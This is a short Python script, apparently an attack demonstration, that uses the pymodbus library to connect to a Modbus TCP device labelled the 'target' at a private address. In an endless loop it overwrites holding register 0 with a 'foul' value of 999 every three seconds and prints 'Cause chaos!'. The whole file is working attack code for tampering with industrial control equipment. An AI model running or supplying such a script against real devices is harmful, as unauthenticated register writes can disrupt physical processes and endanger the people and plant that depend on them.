from pymodbus.client.sync import ModbusTcpClient
import time

client = ModbusTcpClient("192.168.1.32", port=5020) #point at target

while True:
    client.write_register(0, 999) #set foul value at target hr 
    print("Cause chaos!")
    time.sleep(3)
